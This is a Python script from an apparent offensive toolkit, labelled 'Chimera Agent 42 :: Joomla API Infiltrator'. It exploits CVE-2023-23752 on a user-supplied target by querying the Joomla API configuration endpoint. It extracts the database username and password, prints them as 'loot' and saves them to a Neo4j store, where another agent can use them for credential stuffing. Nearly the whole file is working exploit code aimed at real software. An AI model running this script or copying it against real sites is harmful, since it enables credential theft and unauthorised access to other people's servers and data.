import os
import sys
import requests
import json

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[96m" + "="*60)
    print("   CHIMERA AGENT 42 :: JOOMLA API INFILTRATOR")
    print("="*60 + "\033[0m")

    target = input("[?] Target URL (e.g., http://10.0.2.5): ").strip()
    if not target.startswith("http"):
        target = f"http://{target}"

    # 1. Testing CVE-2023-23752 (API Information Disclosure)
    # This endpoint reveals DB credentials in plaintext if unpatched
    vuln_url = f"{target}/api/index.php/v1/config/application?public=true"
    
    print(f"[*] Probing API endpoint: {vuln_url}")

    try:
        r = requests.get(vuln_url, timeout=5, verify=False)
        if r.status_code == 200 and "dbpassword" in r.text:
            print("\033[91m[!!!] CRITICAL: Joomla API is Vulnerable!\033[0m")
            data = r.json()
            
            # Extracting the 'Loot'
            creds = {}
            for item in data.get('data', []):
                attr = item.get('attributes', {})
                key = item.get('id')
                if key in ['user', 'password', 'db', 'host']:
                    creds[key] = item.get('attributes', {}).get('value')

            print(f"    [+] DB User: {creds.get('user')}")
            print(f"    [+] DB Pass: {creds.get('password')}")

            db.report_finding("42_Joomla_Infiltrator", "Joomla_API_Exploit_Success", {
                "target": target,
                "db_user": creds.get('user'),
                "db_pass": creds.get('password'),
                "severity": "CRITICAL"
            })
            
            print("[*] Credentials stored in Neo4j. Agent 38 can now 'Stuff' these.")
        else:
            print("[*] API endpoint is patched or not present.")

    except Exception as e:
        print(f"[!] Connection error: {e}")

    db.close()

if __name__ == "__main__":
    run()
